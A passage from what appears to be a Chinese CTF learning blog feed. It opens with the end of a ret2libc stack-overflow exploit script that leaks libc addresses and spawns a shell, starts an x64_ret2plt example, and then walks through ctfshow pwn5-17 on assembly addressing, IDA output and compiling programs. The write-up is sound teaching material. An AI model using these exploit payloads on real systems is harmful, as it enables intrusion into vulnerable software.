class="string">&quot;write_addr is %#x&quot;</span> %write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果题目给了libc</span></span><br><span class="line"><span class="comment"># libc基地址  = write_addr - libc中write_addr的偏移</span></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base is %#x&quot;</span> %libc_base)</span><br><span class="line"><span class="comment"># 根据基地址获取 system 和 /bin/sh 的地址</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再一次栈溢出，调用system函数执行/bin/sh</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Welcome to Ret2libc\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2libc4&#x27;</span>: pid 70</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">write_addr is 0xf627fb80</span><br><span class="line">libc_base is 0xf6168000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  libc-database  ret2libc1ret2libc3  ret2syscall</span><br><span class="line">exp.py      pwn     ret2libc2ret2libc4  x64_ret2plt</span><br></pre></td></tr></table></figure><h2 id="例-5"><a href="#例-5" class="headerlink" title="例 5"></a>例 5</h2><blockquote><p>点击下载: <a href="../../../../../../../challenges/x64_ret2plt">x64_ret2plt</a><br>需要同时找到 system 函数地址与 &#x2F;bin&#x2F;sh 字符串的地址。<br>使用<code>file</code>和<code>checksec</code>命令查看二进制文件</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec x64_ret2plt</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">$ file x64_ret2plt</span><br><span class="line">x64_ret2plt: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=d20b3b3f61548631d45d5b04c7c5381a196e0631, not stripped</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./x64_ret2plt&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./x64_ret2plt&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="题目-¶"><a href="#题目-¶" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_11">¶</a></h3><ul><li>train.cs.nctu.edu.tw: ret2libc</li></ul><h2 id="题目-¶-1"><a href="#题目-¶-1" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_12">¶</a></h2><ul><li>train.cs.nctu.edu.tw: rop</li><li>2013-PlaidCTF-ropasaurusrex</li><li>Defcon 2015 Qualifier: R0pbaby</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
          <category> 3-基本ROP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn5-34</title>
      <link href="/2025/07/d3c259498976.html"/>
      <url>/2025/07/d3c259498976.html</url>
      
        <content type="html"><![CDATA[<h1 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h1><p>本分类为让大家了解一些寄存器、寻址方式</p><p>汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">; 立即寻址方式</span><br><span class="line">mov eax, 11 ; 将11赋值给eax</span><br><span class="line">add eax, 114504 ; eax加上114504</span><br><span class="line">sub eax, 1 ; eax减去1</span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">mov ebx, 0x36d ; 将0x36d赋值给ebx</span><br><span class="line">mov edx, ebx ; 将ebx的值赋值给edx</span><br><span class="line">; 直接寻址方式</span><br><span class="line">mov ecx, [msg] ; 将msg的地址赋值给ecx</span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">mov esi, msg ; 将msg的地址赋值给esi</span><br><span class="line">mov eax, [esi] ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">add ecx, 4 ; 将ecx加上4</span><br><span class="line">mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">mov edx, 2 ; 将2赋值给edx</span><br><span class="line">mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">mov edx, 1 ; 将1赋值给edx</span><br><span class="line">add ecx, 8 ; 将ecx加上8</span><br><span class="line">mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line">; 输出字符串</span><br><span class="line">mov eax, 4 ; 系统调用号4代表输出字符串</span><br><span class="line">mov ebx, 1 ; 文件描述符1代表标准输出</span><br><span class="line">mov ecx, msg ; 要输出的字符串的地址</span><br><span class="line">mov edx, 22 ; 要输出的字符串的长度</span><br><span class="line">int 0x80 ; 调用系统调用</span><br><span class="line">; 退出程序</span><br><span class="line">mov eax, 1 ; 系统调用号1代表退出程序</span><br><span class="line">xor ebx, ebx ; 返回值为0</span><br><span class="line">int 0x80 ; 调用系统调用</span><br></pre></td></tr></table></figure><p>使用NASM汇编器和ld链接器编译成可执行文件。<br>首先，将代码保存为一个文件，例如 <code>Welcome_CTFshow.asm</code> 。然后，使用以下命令将其编译为对象文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nasm -f elf Welcome_to_CTFshow.asm</span><br></pre></td></tr></table></figure><p>这将生成一个名为 Welcome_CTFshow.o 的对象文件。接下来，使用以下命令将对象文件链接成可执行文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ld -m elf_i386 -s -o Welcome_to_CTFshow Welcome_to_CTFshow.o</span><br></pre></td></tr></table></figure><p>这将生成一个名为 Welcome_CTFshow 的可执行文件。</p><p>IDA查看汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048080                 public start</span><br><span class="line">.text:08048080 start           proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048080                 mov     eax, 0Bh</span><br><span class="line">.text:08048085                 add     eax, 1BF48h</span><br><span class="line">.text:0804808A                 sub     eax, 1</span><br><span class="line">.text:0804808D                 mov     ebx, 36Dh</span><br><span class="line">.text:08048092                 mov     edx, ebx</span><br><span class="line">.text:08048094                 mov     ecx, dword ptr aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:0804809A                 mov     esi, offset aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:0804809F                 mov     eax, [esi]</span><br><span class="line">.text:080480A1                 mov     ecx, offset aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:080480A6                 add     ecx, 4</span><br><span class="line">.text:080480A9                 mov     eax, [ecx]</span><br><span class="line">.text:080480AB                 mov     ecx, offset aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:080480B0                 mov     edx, 2</span><br><span class="line">.text:080480B5                 mov     eax, [ecx+edx*2]</span><br><span class="line">.text:080480B8                 mov     ecx, offset aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:080480BD                 mov     edx, 1</span><br><span class="line">.text:080480C2                 add     ecx, 8</span><br><span class="line">.text:080480C5                 mov     eax, [ecx+edx*2-6]</span><br><span class="line">.text:080480C9                 mov     eax, 4</span><br><span class="line">.text:080480CE                 mov     ebx, 1          ; fd</span><br><span class="line">.text:080480D3                 mov     ecx, offset aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:080480D8                 mov     edx, 16h        ; len</span><br><span class="line">.text:080480DD                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:080480DF                 mov     eax, 1</span><br><span class="line">.text:080480E4                 xor     ebx, ebx        ; status</span><br><span class="line">.text:080480E6                 int     80h             ; LINUX - sys_exit</span><br><span class="line">.text:080480E6 start           endp</span><br><span class="line">.text:080480E6</span><br><span class="line">.text:080480E6 _text           ends</span><br><span class="line">.text:080480E6</span><br><span class="line">.data:080490E8 ; ===========================================================================</span><br><span class="line">.data:080490E8</span><br><span class="line">.data:080490E8 ; Segment type: Pure data</span><br><span class="line">.data:080490E8 ; Segment permissions: Read/Write</span><br><span class="line">.data:080490E8 _data           segment dword public &#x27;DATA&#x27; use32</span><br><span class="line">.data:080490E8                 assume cs:_data</span><br><span class="line">.data:080490E8                 ;org 80490E8h</span><br><span class="line">.data:080490E8 aWelcomeToCtfsh db &#x27;Welcome_to_CTFshow_PWN&#x27;,0</span><br><span class="line">.data:080490E8                                         ; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490E8                                         ; start+14↑r ...</span><br><span class="line">.data:080490E8 _data           ends</span><br><span class="line">.data:080490E8</span><br><span class="line">.data:080490E8</span><br><span class="line">.data:080490E8                 end start</span><br></pre></td></tr></table></figure><p>地址为：0x80490E8</p><h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>Hint：运行此文件，将得到的字符串以ctfshow{xxxxx}提交。</p><p>​        如：运行文件后 输出的内容为 Hello_World</p><p>​        提交的flag值为：ctfshow{Hello_World}</p><p>​        注：计组原理题型后续的flag中地址字母大写</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./Welcome_to_CTFshow</span><br><span class="line">Welcome_to_CTFshow_PWN</span><br></pre></td></tr></table></figure><p>flag:ctfshow{Welcome_to_CTFshow_PWN}</p><h2 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h2><p>Hint：立即寻址方式结束后eax寄存器的值为？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 立即寻址方式</span><br><span class="line">mov eax, 11 ; 将11赋值给eax</span><br><span class="line">add eax, 114504 ; eax加上114504</span><br><span class="line">sub eax, 1 ; eax减去1</span><br></pre></td></tr></table></figure><p>根据题目源码注释片段可以了解到立即寻址方式在哪，而且可以直接算出，在IDA中对应片段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048080                 mov     eax, 0Bh</span><br><span class="line">.text:08048085                 add     eax, 1BF48h</span><br><span class="line">.text:0804808A                 sub     eax, 1</span><br></pre></td></tr></table></figure><p>结果：0x0b+0x1bf48-0x1&#x3D;0x1bf52&#x3D;114514</p><p>flag:ctfshow{114514}</p><h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><p>Hint：寄存器寻址方式结束后edx寄存器的值为？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器寻址方式</span><br><span class="line">mov ebx, 0x36d ; 将0x36d赋值给ebx</span><br><span class="line">mov edx, ebx ; 将ebx的值赋值给edx</span><br></pre></td></tr></table></figure><p>对应IDA片段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804808D                 mov     ebx, 36Dh</span><br><span class="line">.text:08048092                 mov     edx, ebx</span><br></pre></td></tr></table></figure><p>故flag:ctfshow{0x36D}</p><h2 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h2><p>Hint：直接寻址方式结束后ecx寄存器的值为？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 直接寻址方式</span><br><span class="line">mov ecx, [msg] ; 将msg的地址赋值给ecx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048094                 mov     ecx, dword_80490E8</span><br></pre></td></tr></table></figure><p>双击dword_80490E8</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:080490E8 dword_80490E8   dd 636C6557h            ; DATA XREF: LOAD:0804805C↑o</span><br></pre></td></tr></table></figure><p>故flag:ctfshow{0x80490E8}</p><h2 id="pwn9"><a href="#pwn9" class="headerlink" title="pwn9"></a>pwn9</h2><p>Hint：寄存器间接寻址方式结束后eax寄存器的值为？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器间接寻址方式</span><br><span class="line">mov esi, msg ; 将msg的地址赋值给esi</span><br><span class="line">mov eax, [esi] ; 将esi所指向的地址的值赋值给eax</span><br></pre></td></tr></table></figure><p>对应IDA:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804809A                 mov     esi, offset dword_80490E8</span><br><span class="line">.text:0804809F                 mov     eax, [esi]</span><br></pre></td></tr></table></figure><p>双击dword_80490E8</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:080490E8 dword_80490E8   dd 636C6557h            ; DATA XREF: LOAD:0804805C↑o</span><br></pre></td></tr></table></figure><p>这里是将指向地址 的值赋值给eax</p><p>flag:ctfshow{0x636C6557}</p><p><code>Tip:</code>字符串 <code>Welcome_to_CTFshow_PWN</code> 的 ASCII 转十六进制，前几个字节是 <code>57 65 6C 63</code>（对应 <code>W e l c</code> ）， <code>636C6557</code> 可能是字节序反转后的结果（小端存储下，<code>0x57656C63</code> 会存为 <code>63 6C 65 57</code> ）</p><h2 id="pwn10"><a href="#pwn10" class="headerlink" title="pwn10"></a>pwn10</h2><p>Hint：寄存器相对寻址方式结束后eax寄存器的值为？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器相对寻址方式</span><br><span class="line">mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">add ecx, 4 ; 将ecx加上4</span><br><span class="line">mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax</span><br></pre></td></tr></table></figure><p>对应IDA:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080480A1                 mov     ecx, offset dword_80490E8</span><br><span class="line">.text:080480A6                 add     ecx, 4</span><br><span class="line">.text:080480A9                 mov     eax, [ecx]</span><br></pre></td></tr></table></figure><p>双击dword_80490E8</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:080490E8 dword_80490E8   dd 636C6557h            ; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490E8                                         ; start+14↑r ...</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;,0</span><br></pre></td></tr></table></figure><p>这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python <span class="number">3.12</span><span class="number">.3</span> (main, Feb  <span class="number">4</span> <span class="number">2025</span>, <span class="number">14</span>:<span class="number">48</span>:<span class="number">35</span>) [GCC <span class="number">13.3</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0x80490E8</span>+ <span class="number">4</span>)</span><br><span class="line"><span class="string">&#x27;0x80490ec&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也就是“ome_to_CTFshow_PWN”</p><p>故flag:ctfshow{ome_to_CTFshow_PWN}</p><h2 id="pwn11"><a href="#pwn11" class="headerlink" title="pwn11"></a>pwn11</h2><p>Hint：寄存器相对寻址方式结束后eax寄存器的值为？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 基址变址寻址方式</span><br><span class="line">mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">mov edx, 2 ; 将2赋值给edx</span><br><span class="line">mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br></pre></td></tr></table></figure><p>对应IDA:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080480AB                 mov     ecx, offset dword_80490E8</span><br><span class="line">.text:080480B0                 mov     edx, 2</span><br><span class="line">.text:080480B5                 mov     eax, [ecx+edx*2]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:080490E8 dword_80490E8   dd 636C6557h            ; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490E8                                         ; start+14↑r ...</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;,0</span><br></pre></td></tr></table></figure><p>计算最终也是 [0x80490E8 + 2*2 ] &#x3D; [0X80490EC]</p><p>故flag:ctfshow{ome_to_CTFshow_PWN}</p><h2 id="pwn12"><a href="#pwn12" class="headerlink" title="pwn12"></a>pwn12</h2><p>Hint：相对基址变址寻址方式结束后eax寄存器的值为？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 相对基址变址寻址方式</span><br><span class="line">mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">mov edx, 1 ; 将1赋值给edx</span><br><span class="line">add ecx, 8 ; 将ecx加上8</span><br><span class="line">mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br></pre></td></tr></table></figure><p>对应IDA:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080480B8                 mov     ecx, offset dword_80490E8</span><br><span class="line">.text:080480BD                 mov     edx, 1</span><br><span class="line">.text:080480C2                 add     ecx, 8</span><br><span class="line">.text:080480C5                 mov     eax, [ecx+edx*2-6]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:080490E8 dword_80490E8   dd 636C6557h            ; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490E8                                         ; start+14↑r ...</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;,0</span><br></pre></td></tr></table></figure><p>同理：[8 + 0x80490E8 + 1*2 - 6] &#x3D; [0x80490EC]</p><p>故flag:ctfshow{ome_to_CTFshow_PWN}</p><h2 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h2><p>Hint：如何使用GCC？编译运行后即可获得flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> flag.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    char flag[] = &#123;99, 116, 102, 115, 104, 111, 119, 123, 104, 79, 119, 95, 116, 48, 95, 117, 115, 51, 95, 71, 67, 67, 63, 125, 0&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc flag.c -o flag</span><br><span class="line">$ ./flag</span><br><span class="line">ctfshow&#123;hOw_t0_us3_GCC?&#125;</span><br></pre></td></tr></table></figure><p>这段代码是一个简单的 C 程序，它使用字符数组 flag 存储了一个加密的字符串，并通过 printf函数将其打印出来。</p><p>在这段代码中， flag 数组存储了一串整数值，这些整数值代表了字符的 ASCII 码。通过将这些整数值转换为相应的字符，就可以还原出原始的字符串。</p><p>运行该程序， printf 函数使用 %s 格式字符串将 flag 数组作为参数进行打印。由于 flag 数组的最后一个元素为零（NULL 字符）， printf 函数会将其之前的字符依次打印，直到遇到 NULL 字符为止。</p><p>根据给定的整数值数组，还原出的字符串为： ctfshow{hOw_t0_us3_GCC?}</p><p><code>Tip:gcc [选项] 源文件 -o 输出文件</code></p><h2 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h2><p>Hint：请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;CTFshow&quot;</span>&gt;key</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">flag.c  key</span><br><span class="line">$ gcc flag.c -o flag</span><br><span class="line">n$ ./flag</span><br><span class="line">ctfshow&#123;01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010&#125;</span><br></pre></td></tr></table></figure><h6 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> flag.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#define BUFFER_SIZE 1024</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    unsigned char buffer[BUFFER_SIZE];</span><br><span class="line">    size_t n;</span><br><span class="line">    fp = fopen(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == NULL) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Nothing here!&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line">    char output[BUFFER_SIZE * 9 + 12];</span><br><span class="line">    int offset = 0;</span><br><span class="line">    offset += sprintf(output + offset, <span class="string">&quot;ctfshow&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0) &#123;</span><br><span class="line">        <span class="keyword">for</span> (size_t i = 0; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (int j = 7; j &gt;= 0; j--) &#123;</span><br><span class="line">                offset += sprintf(output + offset, <span class="string">&quot;%d&quot;</span>, (buffer[i] &gt;&gt; j) &amp; 1);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i != n - 1) &#123;</span><br><span class="line">                offset += sprintf(output + offset, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!feof(fp)) &#123;</span><br><span class="line">            offset += sprintf(output + offset, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += sprintf(output + offset, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br></pre></td></tr></table></figure><p>程序打开名为 “key” 的文件，以二进制（”rb”）模式进行读取。如果文件打开失败，将输出错误消息 “Nothing here!” 并返回 -1</p><p>然后，程序定义了一个缓冲区 buffer 用于读取文件内容，以及一个字符串数组 output 用于存储转换后的二进制字符串。变量 offset 用于跟踪 output 数组中的偏移量。</p><p>接下来，程序开始将输出字符串初始化为 “ctfshow{“，然后进入一个循环，每次读取</p><p>BUFFER_SIZE 字节的数据到 buffer 中，并将其转换为二进制字符串形式。</p><p>在内层循环中，程序遍历当前读取的字节的每一位，从最高位到最低位。通过右移操作和位与运算，提取出每一位的值，并使用 sprintf 函数将其添加到 output 字符串中。</p><p>在每个字节的二进制表示结束后，如果当前字节不是最后一个字节，则在 output 字符串中添加下划线作为分隔符。</p><p>如果文件还未读取完毕（即文件结束符未被读取），则在 output 字符串中添加空格作为分隔符。</p><p>循环结束后，程序在 output 字符串中添加 “}”，表示结束标记，并使用 printf 函数将最终的转换结果打印出来。</p><p>最后，程序关闭文件，并返回 0 表示成功执行。</p><p>该程序的作用是将二进制文件中的内容转换为二进制字符串形式，并以特定格式输出</p><h2 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h2><p>Hint：编译汇编代码到可执行文件，即可拿到flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nasm -f elf flag.asm -o flag.o</span><br><span class="line">$ ld -m elf_i386 -o flag flag.o</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">flag  flag.asm  flag.o</span><br><span class="line">$ ./flag</span><br><span class="line">ctfshow&#123;@ss3mb1y_1s_3@sy&#125;</span><br></pre></td></tr></table></figure><h6 id="分析过程-1"><a href="#分析过程-1" class="headerlink" title="分析过程"></a>分析过程</h6><p>这段代码是一个使用 x86 汇编语言编写的程序，用于在标准输出上打印一串特定格式的字符串。</p><p>要将这段代码编译为可执行文件，使用汇编器和链接器进行以下步骤：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nasm -f elf flag.asm -o flag.o <span class="comment">#将汇编代码编译为目标文件</span></span><br><span class="line">$ ld -m elf_i386 -o flag flag.o <span class="comment">#将目标文件链接为可执行文件</span></span><br><span class="line">$ ./flag  <span class="comment">#运行此文件，执行后，它会在标准输出上打印出flag</span></span><br></pre></td></tr></table></figure><p><code>Tip:</code>原文件是Intel语法（NASM风格）,如果你是GAS汇编器，执行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#原文件上添加</span><br><span class="line">.intel_syntax noprefix  # 声明使用 Intel 语法，且寄存器无需 % 前缀</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ as --32 -o output.o input.asm  <span class="comment"># 32 位汇编（根据需要调整架构）</span></span><br><span class="line">$ ld -m elf_i386 -o output output.o  <span class="comment"># 32 位链接</span></span><br></pre></td></tr></table></figure><h2 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h2><p>Hint：使用gcc将其编译为可执行文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc flag.s -o flag</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">flag  flag.s</span><br><span class="line">$ ./flag</span><br><span class="line">ctfshow&#123;daniuniuda&#125;</span><br></pre></td></tr></table></figure><h6 id="分析过程-2"><a href="#分析过程-2" class="headerlink" title="分析过程:"></a>分析过程:</h6><p>.s 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。汇编语言是一种低级编程语言，用于直接操作计算机的指令集架构。 .s 文件通常由汇编器（Assembler）处理，将其转换为可执行文件或目标文件。</p><p>可以使用 gcc 命令直接编译汇编语言源文件（ .s 文件）并将其链接为可执行文件。 gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。</p><h2 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h2><p>Hint：有些命令好像有点不一样？</p><p>​        不要一直等，可能那样永远也等不到flag</p><p><code>题目考查点为Linux基础命令的拼接</code></p><p>在Linux命令中，分号（ ; ）用于分隔多个命令，允许在一行上顺序执行多个命令。</p><p>当使用分号（ ; ）将命令连接在一起时，它们按照从左到右的顺序逐个执行，无论前面的命令是否成功。这意味着无论前一个命令是否成功执行，后续的命令都将被执行。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">例如，考虑以下命令：</span><br><span class="line">command1 ; command2 ; command3 </span><br><span class="line">在这个例子中，command1 执行完毕后，无论成功与否，接着会执行 command2，然后再执行command3 